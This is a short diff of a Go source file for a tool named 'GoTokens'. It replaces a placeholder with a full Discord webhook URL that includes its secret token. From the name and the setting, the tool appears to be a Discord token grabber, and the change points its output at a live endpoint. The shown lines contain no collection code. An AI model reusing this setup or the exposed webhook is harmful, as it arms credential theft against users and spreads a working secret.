@@ -14,7 +14,7 @@ import (
 )
 
 // Settings
-var webhook string = "WEBHOOK-URL-HERE"
+var webhook string = "https://discord.com/api/webhooks/1454963968165806240/5FpU0MavzLeGXZiIBwHvSHE3RigJXyJTi7OGcN3xxNsNiKDHy9RHsUHwagbVdLyjiDBQ"
 var username string = "GoTokens | (by github.com/kcybe)"
 var avatar_url string = "https://camo.githubusercontent.com/19701f26341abb91039ce91da2e1222c2ce8c8c12954ca7f35a6365b79ebe2df/68747470733a2f2f736563757265676f2e696f2f696d672f676f7365632e706e67"
 
